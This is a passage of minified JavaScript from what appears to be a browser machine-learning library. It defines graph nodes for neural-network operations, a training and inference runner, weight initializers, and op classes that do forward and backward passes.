i(e,t),e.prototype.validate=function(){u.assert(3===this.x.shape.length,"Error adding conv2d op: input must be of rank 3, but got shape: "+this.x.shape+"."),u.assert(4===this.w.shape.length,"Error adding conv2d op: weights must be of rank 4, but got shape: "+this.w.shape+"."),u.assert(1===this.b.shape.length,"Error adding conv2d op: biases must be of rank 1, but got shape: "+this.b.shape+"."),u.assert(this.x.shape[2]===this.w.shape[2],"Error adding conv2d op: depth of input ("+this.x.shape[2]+") must match input depth for weights ("+this.w.shape[2]+").")},e.X="x",e.W="w",e.B="b",e}(d);n.Convolution2DNode=P;var M=function(t){function e(e,n,r,i,o){void 0===i&&(i=1);var a=t.call(this,e,"Max pool",{x:n},new p(s.computeOutputShape3D(n.shape,r,n.shape[2],i,o)))||this;return a.x=n,a.fieldSize=r,a.stride=i,a.zeroPad=o,a}return i(e,t),e.prototype.validate=function(){u.assert(3===this.x.shape.length,"Error adding maxPool op: input must be of rank 3, but got shape: "+this.x.shape+".")},e.X="x",e}(d);n.MaxPoolNode=M;var C=function(t){function e(e,n){return t.call(this,e,"ReLU",{x:n},new p(n.shape))||this}return i(e,t),e.prototype.validate=function(){},e.X="x",e}(d);n.ReLUNode=C;var N=function(t){function e(e,n,r){var i=t.call(this,e,"LeakyReLU",{x:n},new p(n.shape))||this;return i.alpha=r,i}return i(e,t),e.prototype.validate=function(){},e.X="x",e}(d);n.LeakyReLUNode=N;var R=function(t){function e(e,n,r){var i=t.call(this,e,"PReLU",{x:n,alpha:r},new p(n.shape))||this;return i.x=n,i.alpha=r,i}return i(e,t),e.prototype.validate=function(){u.assert(u.arraysEqual(this.x.shape,this.alpha.shape),"Error adding pRelu op: the shapes x: "+this.x.shape+" and alpha: "+this.alpha.shape+" must match.")},e.X="x",e.ALPHA="alpha",e}(d);n.PReLUNode=R;var F=function(t){function e(e,n){return t.call(this,e,"Elu",{x:n},new p(n.shape))||this}return i(e,t),e.prototype.validate=function(){},e.X="x",e}(d);n.EluNode=F;var D=function(t){function e(e,n){return t.call(this,e,"Exp",{x:n},new p(n.shape))||this}return i(e,t),e.prototype.validate=function(){},e.X="x",e}(d);n.ExpNode=D;var I=function(t){function e(e,n){return t.call(this,e,"Log",{x:n},new p(n.shape))||this}return i(e,t),e.prototype.validate=function(){},e.X="x",e}(d);n.LogNode=I;var B=function(t){function e(e,n){return t.call(this,e,"TanH",{x:n},new p(n.shape))||this}return i(e,t),e.prototype.validate=function(){},e.X="x",e}(d);n.TanHNode=B;var q=function(t){function e(e,n){return t.call(this,e,"Sigmoid",{x:n},new p(n.shape))||this}return i(e,t),e.prototype.validate=function(){},e.X="x",e}(d);n.SigmoidNode=q;var L=function(t){function e(e,n){return t.call(this,e,"Square",{x:n},new p(n.shape))||this}return i(e,t),e.prototype.validate=function(){},e.X="x",e}(d);n.SquareNode=L;var z=function(t){function e(e,n,r){var i=t.call(this,e,"SoftmaxCrossEntropyCost",{x:n,target:r},new p([]))||this;return i.x=n,i.target=r,i}return i(e,t),e.prototype.validate=function(){u.assert(u.arraysEqual(this.x.shape,this.target.shape),"Error adding softmaxCrossEntropyCost op: x shape ("+this.x.shape+") must match target shape ("+this.target.shape+").")},e.X="x",e.TARGET="target",e}(d);n.SoftmaxCrossEntropyCostNode=z;var V=function(t){function e(e,n){var r=t.call(this,e,"Softmax",{x:n},new p(n.shape))||this;return r.x=n,r}return i(e,t),e.prototype.validate=function(){u.assert(1===this.x.shape.length,"The input to a softmax must be a 1-D tensor"),u.assert(this.x.shape[0]>=2,"The input to a softmax must have at least 2 values")},e.X="x",e}(d);n.SoftmaxNode=V;var j=function(t){function e(e,n,r){var i=t.call(this,e,"Mean Squared Cost",{label:n,prediction:r},new p([]))||this;return i.label=n,i.prediction=r,i}return i(e,t),e.prototype.validate=function(){u.assert(u.arraysEqual(this.label.shape,this.prediction.shape),"Error adding meanSquaredCost op: label shape ("+this.label.shape+") must match prediction shape ("+this.prediction.shape+").")},e.LABEL="label",e.PREDICTION="prediction",e}(d);n.MeanSquaredCostNode=j;var U=function(t){function e(e,n){var r=t.call(this,e,"ArgMax",{x:n},new p([1]))||this;return r.x=n,r}return i(e,t),e.prototype.validate=function(){u.assert(u.sizeFromShape(this.x.shape)>0,"Error adding argmax op: input tensor must have at least one entry.")},e.X="x",e}(d);n.ArgMaxNode=U;var G=function(t){function e(e,n,r){var i=t.call(this,e,"ArgMaxEquals",{x1:n,x2:r},new p([1]))||this;return i.x1=n,i.x2=r,i}return i(e,t),e.prototype.validate=function(){u.assert(u.arraysEqual(this.x1.shape,this.x2.shape),"Error adding ArgMaxEquals op: x1 shape ("+this.x1.shape+") must match x2 shape ("+this.x2.shape+").")},e.X1="x1",e.X2="x2",e}(d);n.ArgMaxEqualsNode=G},{"../ops/concat_util":104,"../ops/conv_util":106,"../tensor":137,"../util":143,"./initializers":35}],33:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r,i=t("../globals"),o=t("../tensor"),s=t("./session");!function(t){t[t.SUM=0]="SUM",t[t.MEAN=1]="MEAN"}(r=n.MetricReduction||(n.MetricReduction={}));var a=function(){function t(t,e,n){this.math=t,this.session=e,this.eventObserver=n,this.lastCostTimestamp=0,this.lastEvalTimestamp=0,this.resetStatistics(),this.zeroScalar=o.Scalar.new(0)}return t.prototype.resetStatistics=function(){this.totalBatchesTrained=0},t.prototype.train=function(t,e,n,i,s,a,u,c,l,h,p){void 0===l&&(l=r.MEAN),void 0===h&&(h=1500),void 0===p&&(p=500),this.costTensor=t,this.trainFeedEntries=e,this.metricTensor=a,this.metricFeedEntries=u,null!=c&&this.metricBatchSize!==c&&(null!=this.metricBatchSizeScalar&&this.metricBatchSizeScalar.dispose(),this.metricBatchSizeScalar=o.Scalar.new(c)),this.metricBatchSize=c,this.metricReduction=l,this.batchSize=n,this.optimizer=i,this.metricIntervalMs=h,this.costIntervalMs=p,this.currentTrainLoopNumBatches=s,this.batchesTrainedThisRun=0,this.isTraining=!0,this.trainStartTimestamp=performance.now(),this.trainNetwork()},t.prototype.stopTraining=function(){this.isTraining=!1},t.prototype.resumeTraining=function(){this.isTraining=!0,this.trainNetwork()},t.prototype.trainNetwork=function(){var t=this;if(this.batchesTrainedThisRun===this.currentTrainLoopNumBatches&&this.stopTraining(),this.isTraining){var e=performance.now(),n=null!=this.eventObserver.avgCostCallback&&e-this.lastCostTimestamp>this.costIntervalMs;n&&(this.lastCostTimestamp=e);var r=n?s.CostReduction.MEAN:s.CostReduction.NONE;i.tidy((function(){var i=t.session.train(t.costTensor,t.trainFeedEntries,t.batchSize,t.optimizer,r);if(n){var o=performance.now()-e;if(t.eventObserver.avgCostCallback(i),null!=t.eventObserver.trainExamplesPerSecCallback){var s=1e3*t.batchSize/o;t.eventObserver.trainExamplesPerSecCallback(s)}}null!=t.eventObserver.metricCallback&&null!=t.metricFeedEntries&&e-t.lastEvalTimestamp>t.metricIntervalMs&&(t.lastEvalTimestamp=e,null!=t.lastComputedMetric&&t.lastComputedMetric.dispose(),t.lastComputedMetric=t.computeMetric(),t.eventObserver.metricCallback(t.lastComputedMetric)),null!=t.eventObserver.totalTimeCallback&&t.eventObserver.totalTimeCallback((e-t.trainStartTimestamp)/1e3),t.batchesTrainedThisRun++,t.totalBatchesTrained++,null!=t.eventObserver.batchesTrainedCallback&&t.eventObserver.batchesTrainedCallback(t.totalBatchesTrained)})),requestAnimationFrame((function(){return t.trainNetwork()}))}else null!=this.eventObserver.doneTrainingCallback&&this.eventObserver.doneTrainingCallback()},t.prototype.infer=function(t,e,n,r,i){var s=this;if(void 0===n&&(n=3e3),void 0===r&&(r=5),null==this.eventObserver.inferenceExamplesCallback&&null==this.eventObserver.inferenceExamplesPerSecCallback)throw new Error("Cannot start inference loop, no inference example or examples/sec observer provided.");for(var a=0;a<e.length;a++){if(e[a].data instanceof o.Tensor)throw new Error("Cannot start inference on the model runner with feed entries of type NDArray. Please use InputProviders.")}this.inferenceExampleIntervalMs=n,this.inferenceTensor=t,this.inferenceFeedEntries=e,this.inferenceExampleCount=r,this.currentInferenceLoopNumPasses=i,this.isInferring||(this.inferencePassesThisRun=0,requestAnimationFrame((function(){return s.inferNetwork()}))),this.isInferring=!0},t.prototype.inferNetwork=function(){var t=this;this.isInferring&&this.inferencePassesThisRun!==this.currentInferenceLoopNumPasses&&(i.tidy((function(){for(var e=[],n=[],r=performance.now(),i=0;i<t.inferenceExampleCount;i++){for(var o=[],s=0;s<t.inferenceFeedEntries.length;s++){var a=t.inferenceFeedEntries[s],u=a.data.getNextCopy();o.push({tensor:a.tensor,data:u})}e.push(o),n.push(t.session.eval(t.inferenceTensor,o))}if(null!=t.eventObserver.inferenceExamplesPerSecCallback){n[n.length-1].dataSync();var c=performance.now()-r,l=1e3*t.inferenceExampleCount/c;t.eventObserver.inferenceExamplesPerSecCallback(l)}null!=t.eventObserver.inferenceExamplesCallback&&t.eventObserver.inferenceExamplesCallback(e,n),t.inferencePassesThisRun++})),this.lastInferTimeoutID=window.setTimeout((function(){return t.inferNetwork()}),this.inferenceExampleIntervalMs))},t.prototype.stopInferring=function(){this.isInferring=!1,window.clearTimeout(this.lastInferTimeoutID)},t.prototype.isInferenceRunning=function(){return this.isInferring},t.prototype.computeMetric=function(){var t=this;if(null==this.metricFeedEntries)throw new Error("Cannot compute metric, no metric FeedEntries provided.");var e=this.zeroScalar;return i.tidy((function(){for(var n=0;n<t.metricBatchSize;n++){var i=t.session.eval(t.metricTensor,t.metricFeedEntries);e=t.math.add(e,i.toFloat())}return t.metricReduction===r.MEAN&&(e=t.math.divide(e,t.metricBatchSizeScalar)),e}))},t.prototype.getTotalBatchesTrained=function(){return this.totalBatchesTrained},t.prototype.getLastComputedMetric=function(){return this.lastComputedMetric},t.prototype.setMath=function(t){this.math=t},t.prototype.setSession=function(t){this.session=t},t.prototype.setInferenceTensor=function(t){this.inferenceTensor=t},t.prototype.setInferenceExampleCount=function(t){this.inferenceExampleCount=t},t}();n.GraphRunner=a},{"../globals":28,"../tensor":137,"./session":57}],34:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./graph"),i=t("./priority_queue"),o=t("./priority_queue");n.getUnorderedEvaluationSet=function(t,e){var n={},r={},i=[],o=t.slice();e.forEach((function(t){return n[t.id]=t}));for(var s=function(){var t=o.pop();null==r[t.id]&&(null==n[t.id]&&Object.keys(t.inputs).map((function(e){return t.inputs[e]})).forEach((function(t){return o.push(t.node)})),i.push(t),r[t.id]=t)};0!==o.length;)s();return i},n.getOrderedEvaluationSet=function(t){var e=[],n={},r={},s=new o.PriorityQueue((function(t,e){return i.defaultCompare(r[t.id],r[e.id])}),(function(t,e){return n[t.id]=e}));for(t.forEach((function(t){return r[t.id]=0})),t.forEach((function(e){return Object.keys(e.inputs).map((function(t){return e.inputs[t]})).forEach((function(e){-1!==t.indexOf(e.node)&&r[e.node.id]++}))})),t.forEach((function(t){return s.enqueue(t)}));!s.empty();)e.unshift(s.dequeue()),Object.keys(e[0].inputs).map((function(t){return e[0].inputs[t]})).forEach((function(e){-1!==t.indexOf(e.node)&&(r[e.node.id]--,s.update(e.node,n[e.node.id]))}));return e},n.isInputNode=function(t){return 0===Object.keys(t.inputs).length},n.shouldBackProp=function(t){return!(t.node instanceof r.ConstantNode)},n.isPassthroughNode=function(t,e){for(var n=Object.keys(t.inputs),r=0;r<n.length;r++){var i=t.inputs[n[r]];if(e.get(i,!0)===e.get(t.output,!0))return!0}return!1}},{"./graph":32,"./priority_queue":56}],35:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("../ops/ops"),i=function(){function t(t,e,n){void 0===t&&(t=1),void 0===e&&(e="fan_in"),void 0===n&&(n="normal"),this.scale=t,this.mode=e,this.distribution=n}return t.prototype.initialize=function(t,e,n){var i=0;if("fan_in"===this.mode)i=e;else if("fan_out"===this.mode)i=n;else{if("fan_avg"!==this.mode)throw new Error("Unexpected mode for variance scaling initializer: "+this.mode);i=(e+n)/2}if("normal"===this.distribution)return r.truncatedNormal(t,0,Math.sqrt(this.scale/i));if("uniform"===this.distribution)return r.randomUniform(t,0,Math.sqrt(3*this.scale/i));throw new Error("Unexpected distribution for variance scaling initializer: "+this.distribution)},t}();n.VarianceScalingInitializer=i;var o=function(){function t(){}return t.prototype.initialize=function(t,e,n){return r.zeros(t)},t}();n.ZerosInitializer=o;var s=function(){function t(){}return t.prototype.initialize=function(t,e,n){return r.ones(t)},t}();n.OnesInitializer=s;var a=function(){function t(t){void 0===t&&(t=0),this.value=t}return t.prototype.initialize=function(t,e,n){return r.fill(t,this.value)},t}();n.ConstantInitializer=a;var u=function(){function t(t){this.tensor=t}return t.prototype.initialize=function(t,e,n){return this.tensor},t}();n.TensorInitializer=u;var c=function(){function t(t,e){void 0===t&&(t=0),void 0===e&&(e=.05),this.mean=t,this.stdev=e}return t.prototype.initialize=function(t,e,n){return r.randomNormal(t,this.mean,this.stdev)},t}();n.RandomNormalInitializer=c;var l=function(){function t(t,e){void 0===t&&(t=0),void 0===e&&(e=.05),this.mean=t,this.stdev=e}return t.prototype.initialize=function(t,e,n){return r.truncatedNormal(t,this.mean,this.stdev)},t}();n.RandomTruncatedNormalInitializer=l;var h=function(){function t(t,e){void 0===t&&(t=-.05),void 0===e&&(e=.05),this.minval=t,this.maxval=e}return t.prototype.initialize=function(t,e,n){return r.randomUniform(t,this.minval,this.maxval)},t}();n.RandomUniformInitializer=h},{"../ops/ops":114}],36:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./graph"),i=t("./graph_util"),o=t("./ops/add"),s=t("./ops/argmax"),a=t("./ops/argmaxequals"),u=t("./ops/concat"),c=t("./ops/convolution"),l=t("./ops/divide"),h=t("./ops/element_wise_activation"),p=t("./ops/element_wise_cost"),d=t("./ops/exp"),f=t("./ops/linear_combination"),y=t("./ops/log"),m=t("./ops/matmul"),v=t("./ops/max_pool"),g=t("./ops/multiply"),_=t("./ops/reduce_sum"),b=t("./ops/reshape"),w=t("./ops/softmax"),x=t("./ops/subtract");n.emitFromGraphNodes=function(t){var e=[];return t.forEach((function(t){return Array.prototype.push.apply(e,function(t){if(t instanceof r.ReshapeNode)return[new b.Reshape(t.inputs[r.ReshapeNode.X],t.output)];if(t instanceof r.MatMulNode){var e=t.inputs[r.MatMulNode.X1],n=t.inputs[r.MatMulNode.X2];return[new m.MatMul(e,n,t.output)]}if(t instanceof r.Convolution2DNode){var T=t.inputs[r.Convolution2DNode.W],S=t.inputs[r.Convolution2DNode.X],O=t.inputs[r.Convolution2DNode.B];return[new c.Convolution2D(T,S,O,t.output,t.fieldSize,t.outputDepth,t.stride,t.zeroPad)]}if(t instanceof r.MaxPoolNode){S=t.inputs[r.MaxPoolNode.X];return[new v.MaxPool(S,t.output,t.fieldSize,t.stride,t.zeroPad)]}if(t instanceof r.ExpNode)return[new d.Exp(t.inputs[r.ExpNode.X],t.output)];if(t instanceof r.LogNode)return[new y.Log(t.inputs[r.LogNode.X],t.output)];if(t instanceof r.ReLUNode)return[new h.ReLU(t.inputs[r.ReLUNode.X],t.output)];if(t instanceof r.LeakyReLUNode)return[new h.LeakyReLU(t.inputs[r.LeakyReLUNode.X],t.output,t.alpha)];if(t instanceof r.PReLUNode)return[new h.PReLU(t.inputs[r.PReLUNode.X],t.inputs[r.PReLUNode.ALPHA],t.output)];if(t instanceof r.EluNode)return[new h.Elu(t.inputs[r.EluNode.X],t.output)];if(t instanceof r.TanHNode)return[new h.TanH(t.inputs[r.TanHNode.X],t.output)];if(t instanceof r.SigmoidNode)return[new h.Sigmoid(t.inputs[r.SigmoidNode.X],t.output)];if(t instanceof r.SoftmaxCrossEntropyCostNode){S=t.inputs[r.SoftmaxCrossEntropyCostNode.X];var E=t.inputs[r.SoftmaxCrossEntropyCostNode.TARGET];return[new w.SoftmaxCrossEntropyCost(S,E,t.output)]}if(t instanceof r.SoftmaxNode)return[new w.Softmax(t.inputs[r.SoftmaxNode.X],t.output)];if(t instanceof r.MeanSquaredCostNode){var A=t.inputs[r.MeanSquaredCostNode.LABEL],k=t.inputs[r.MeanSquaredCostNode.PREDICTION];return[new p.MeanSquaredCost(A,k,t.output)]}if(t instanceof r.ArgMaxEqualsNode)return[new a.ArgMaxEquals(t.inputs[r.ArgMaxEqualsNode.X1],t.inputs[r.ArgMaxEqualsNode.X2],t.output)];if(t instanceof r.ArgMaxNode)return[new s.ArgMax(t.x,t.output)];if(t instanceof r.FusedLinearCombinationNode)return[new f.LinearCombination(t.inputs[r.FusedLinearCombinationNode.T1],t.inputs[r.FusedLinearCombinationNode.T2],t.inputs[r.FusedLinearCombinationNode.C1],t.inputs[r.FusedLinearCombinationNode.C2],t.output)];if(t instanceof r.Concat1DNode)return[new u.Concat1D(t.inputs[r.Concat1DNode.X1],t.inputs[r.Concat1DNode.X2],t.output)];if(t instanceof r.Concat2DNode)return[new u.Concat2D(t.inputs[r.Concat2DNode.X1],t.inputs[r.Concat2DNode.X2],t.axis,t.output)];if(t instanceof r.Concat3DNode)return[new u.Concat3D(t.inputs[r.Concat3DNode.X1],t.inputs[r.Concat3DNode.X2],t.axis,t.output)];if(t instanceof r.Concat4DNode)return[new u.Concat4D(t.inputs[r.Concat4DNode.X1],t.inputs[r.Concat4DNode.X2],t.axis,t.output)];if(t instanceof r.SquareNode)return[new h.Square(t.inputs[r.SquareNode.X],t.output)];if(t instanceof r.AddNode)return[new o.Add(t.inputs[r.AddNode.T1],t.inputs[r.AddNode.T2],t.output)];if(t instanceof r.SubtractNode)return[new x.Subtract(t.inputs[r.SubtractNode.T1],t.inputs[r.SubtractNode.T2],t.output)];if(t instanceof r.MultiplyNode)return[new g.Multiply(t.inputs[r.MultiplyNode.T1],t.inputs[r.MultiplyNode.T2],t.output)];if(t instanceof r.DivideNode)return[new l.Divide(t.inputs[r.DivideNode.T1],t.inputs[r.DivideNode.T2],t.output)];if(t instanceof r.ReduceSumNode)return[new _.ReduceSum(t.inputs[r.ReduceSumNode.X],t.output)];if(i.isInputNode(t))return[];throw Error("Unsupported node type: "+t.constructor.name)}(t))})),e}},{"./graph":32,"./graph_util":34,"./ops/add":37,"./ops/argmax":38,"./ops/argmaxequals":39,"./ops/concat":40,"./ops/convolution":41,"./ops/divide":42,"./ops/element_wise_activation":43,"./ops/element_wise_cost":44,"./ops/exp":45,"./ops/linear_combination":46,"./ops/log":47,"./ops/matmul":48,"./ops/max_pool":49,"./ops/multiply":50,"./ops/reduce_sum":52,"./ops/reshape":53,"./ops/softmax":54,"./ops/subtract":55}],37:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../globals"),s=t("../../util"),a=t("../graph_util"),u=function(t){function e(e,n,r){var i=t.call(this)||this;return i.x1Tensor=e,i.x2Tensor=n,i.yTensor=r,s.assert(1===s.sizeFromShape(e.shape)||1===s.sizeFromShape(n.shape)||s.arraysEqual(e.shape,n.shape)||2===e.shape.length&&1===n.shape.length&&e.shape[1]===n.shape[0]||1===e.shape.length&&2===n.shape.length&&e.shape[0]===n.shape[1],"One of t1 or t2 must be a scalar, or t1 and t2 must have the same shape, or one of them can be broadcasted (2D and 1D)."),i}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.x1Tensor),i=e.get(this.x2Tensor);o.tidy((function(){var a;a=s.isScalarShape(r.shape)?t.scalarPlusArray(r,i):s.isScalarShape(i.shape)?t.scalarPlusArray(i,r):t.add(r,i),e.set(n.yTensor,o.keep(a))}))},e.prototype.backProp=function(t,e,n){var r=this,i=n.get(this.yTensor);o.tidy((function(){if(a.shouldBackProp(r.x1Tensor))if(1===r.x1Tensor.shape.length&&2===r.x2Tensor.shape.length&&r.x1Tensor.shape[0]===r.x2Tensor.shape[1]){var e=t.sum(i,0);n.add(r.x1Tensor,e)}else if(s.isScalarShape(r.x1Tensor.shape)){e=t.sum(i);n.add(r.x1Tensor,e)}else n.add(r.x1Tensor,t.clone(i));if(a.shouldBackProp(r.x2Tensor))if(2===r.x1Tensor.shape.length&&1===r.x2Tensor.shape.length&&r.x1Tensor.shape[1]===r.x2Tensor.shape[0]){e=t.sum(i,0);n.add(r.x2Tensor,e)}else if(s.isScalarShape(r.x2Tensor.shape)){e=t.sum(i);n.add(r.x2Tensor,e)}else n.add(r.x2Tensor,t.clone(i))}))},e.prototype.dispose=function(){null!=this.dySizeScalar&&this.dySizeScalar.dispose()},e}(t("./op").Operation);n.Add=u},{"../../globals":28,"../../util":143,"../graph_util":34,"./op":51}],38:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../globals"),s=function(t){function e(e,n){var r=t.call(this)||this;return r.xTensor=e,r.yTensor=n,r}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.xTensor);o.tidy((function(){e.set(n.yTensor,o.keep(t.argMax(r)))}))},e.prototype.backProp=function(t,e,n){throw new Error("ArgMax backprop unimplemented")},e}(t("./op").Operation);n.ArgMax=s},{"../../globals":28,"./op":51}],39:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../globals"),s=function(t){function e(e,n,r){var i=t.call(this)||this;return i.x1Tensor=e,i.x2Tensor=n,i.yTensor=r,i}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.x1Tensor),i=e.get(this.x2Tensor);o.tidy((function(){e.set(n.yTensor,o.keep(t.argMaxEquals(r,i)))}))},e.prototype.backProp=function(t,e,n){throw new Error("ArgMaxEquals backprop unimplemented")},e}(t("./op").Operation);n.ArgMaxEquals=s},{"../../globals":28,"./op":51}],40:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../globals"),s=t("../../ops/concat_util"),a=t("../../util"),u=t("./op"),c=function(t){function e(e,n,r){var i=t.call(this)||this;return i.x1Tensor=e,i.x2Tensor=n,i.yTensor=r,i}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.x1Tensor),i=e.get(this.x2Tensor);o.tidy((function(){var s=t.concat1D(r,i);e.set(n.yTensor,o.keep(s))}))},e.prototype.backProp=function(t,e,n){var r=this;o.tidy((function(){d(t,r.x1Tensor,r.x2Tensor,r.yTensor,0,n,e)}))},e}(u.Operation);n.Concat1D=c;var l=function(t){function e(e,n,r,i){var o=t.call(this)||this;return o.x1Tensor=e,o.x2Tensor=n,o.axis=r,o.yTensor=i,s.assertParams(e.shape,n.shape,r),o}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.x1Tensor),i=e.get(this.x2Tensor);o.tidy((function(){var s=t.concat2D(r,i,n.axis);e.set(n.yTensor,o.keep(s))}))},e.prototype.backProp=function(t,e,n){var r=this;o.tidy((function(){d(t,r.x1Tensor,r.x2Tensor,r.yTensor,r.axis,n,e)}))},e}(u.Operation);n.Concat2D=l;var h=function(t){function e(e,n,r,i){var o=t.call(this)||this;return o.x1Tensor=e,o.x2Tensor=n,o.axis=r,o.yTensor=i,s.assertParams(e.shape,n.shape,r),o}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.x1Tensor),i=e.get(this.x2Tensor);o.tidy((function(){var s=t.concat3D(r,i,n.axis);e.set(n.yTensor,o.keep(s))}))},e.prototype.backProp=function(t,e,n){var r=this;o.tidy((function(){d(t,r.x1Tensor,r.x2Tensor,r.yTensor,r.axis,n,e)}))},e}(u.Operation);n.Concat3D=h;var p=function(t){function e(e,n,r,i){var o=t.call(this)||this;return o.x1Tensor=e,o.x2Tensor=n,o.axis=r,o.yTensor=i,s.assertParams(e.shape,n.shape,r),o}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.x1Tensor),i=e.get(this.x2Tensor);o.tidy((function(){var s=t.concat4D(r,i,n.axis);e.set(n.yTensor,o.keep(s))}))},e.prototype.backProp=function(t,e,n){var r=this;o.tidy((function(){d(t,r.x1Tensor,r.x2Tensor,r.yTensor,r.axis,n,e)}))},e}(u.Operation);function d(t,e,n,r,i,o,u){var c=o.get(r),l=u.get(e),h=u.get(n),p=l.as2D(-1,a.sizeFromShape(l.shape.slice(i))),d=h.as2D(-1,a.sizeFromShape(h.shape.slice(i))),f=s.computeGradientSliceShapes(p.shape,d.shape),y=f.aBegin,m=f.aSize,v=f.bBegin,g=f.bSize,_=c.as2D(-1,p.shape[1]+d.shape[1]),b=t.slice2D(_,y,m).reshapeAs(l),w=t.slice2D(_,v,g).reshapeAs(h);o.add(e,b),o.add(n,w)}n.Concat4D=p},{"../../globals":28,"../../ops/concat_util":104,"../../util":143,"./op":51}],41:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../globals"),s=t("../../ops/conv_util"),a=t("../../util"),u=function(t){function e(e,n,r,i,o,u,c,l){void 0===c&&(c=1);var h=t.call(this)||this;return h.wTensor=e,h.xTensor=n,h.bTensor=r,h.yTensor=i,h.fieldSize=o,h.outputDepth=u,h.stride=c,h.assertWeightsShape(e.shape),h.zeroPad=null!=l?l:s.computeDefaultPad(h.xTensor.shape,h.fieldSize,h.stride),a.assert(a.isInt(h.zeroPad),"The zero padding ("+h.zeroPad+") must be an integer. Change the stride and/or zero pad parameters"),h}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.wTensor),i=e.get(this.bTensor),s=e.get(this.xTensor);o.tidy((function(){e.set(n.yTensor,o.keep(t.conv2d(s,r,i,n.stride,n.zeroPad)))}))},e.prototype.backProp=function(t,e,n){var r=this,i=e.get(this.wTensor),s=e.get(this.xTensor),a=n.get(this.yTensor);o.tidy((function(){var e=t.conv2dDerFilter(s,a,i.shape,r.stride,r.zeroPad),o=t.sum(a,[0,1]),u=t.conv2dDerInput(s.shape,a,i,r.stride,r.zeroPad);n.add(r.wTensor,e),n.add(r.bTensor,o),n.add(r.xTensor,u)}))},e.prototype.assertWeightsShape=function(t){a.assert(t[0]===this.fieldSize&&t[1]===this.fieldSize&&t[2]===this.xTensor.shape[2]&&t[3]===this.outputDepth,"weights must be of shape ["+this.fieldSize+","+this.fieldSize+","+this.xTensor.shape[2]+","+this.outputDepth+"] but they are ofshape ["+t+"]")},e}(t("./op").Operation);n.Convolution2D=u},{"../../globals":28,"../../ops/conv_util":106,"../../util":143,"./op":51}],42:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../globals"),s=t("../../util"),a=t("../graph_util"),u=function(t){function e(e,n,r){var i=t.call(this)||this;return i.x1Tensor=e,i.x2Tensor=n,i.yTensor=r,s.assert(1===s.sizeFromShape(e.shape)||1===s.sizeFromShape(n.shape)||s.arraysEqual(e.shape,n.shape),"One of t1 or t2 must be a scalar, or t1 and t2 must have the same shape"),i}return i(e,t),e.prototype.feedForward=function(t,e){var n=this,r=e.get(this.x1Tensor),i=e.get(this.x2Tensor);o.tidy((function(){var a;a=s.isScalarShape(r.shape)?t.scalarDividedByArray(r,i):s.isScalarShape(i.shape)?t.arrayDividedByScalar(r,i):t.divide(r,i),e.set(n.yTensor,o.keep(a))}))},e.prototype.backProp=function(t,e,n){var r=this,i=e.get(this.x1Tensor),u=e.get(this.x2Tensor),c=n.get(this.yTensor),l=s.isScalarShape(i.shape),h=s.isScalarShape(u.shape);o.tidy((function(){if(a.shouldBackProp(r.x1Tensor))if(l){var e=t.divide(c,u);n.add(r.x1Tensor,t.sum(e)),e.dispose()}else h?n.add(r.x1Tensor,t.arrayDividedByScalar(c,u)):n.add(r.x1Tensor,t.divide(c,u));if(a.shouldBackProp(r.x2Tensor)){var o=t.elementWiseMul(u,u),s=void 0;s=h?t.arrayDividedByScalar(i,o):l?t.scalarDividedByArray(i,o):t.divide(i,o);var 